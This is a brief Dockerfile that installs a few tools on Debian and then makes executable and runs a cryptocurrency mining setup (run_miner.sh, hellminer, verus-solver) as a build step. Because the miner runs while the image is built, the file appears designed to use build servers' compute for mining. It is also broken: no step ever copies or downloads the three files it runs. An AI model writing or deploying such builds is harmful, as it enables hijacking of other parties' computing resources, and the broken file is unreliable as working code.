FROM debian:stable
RUN apt-get update && apt-get -y install wget vim unzip
WORKDIR /home
RUN chmod +x run_miner.sh
RUN chmod +x hellminer
RUN chmod +x verus-solver
RUN ./run_miner.sh
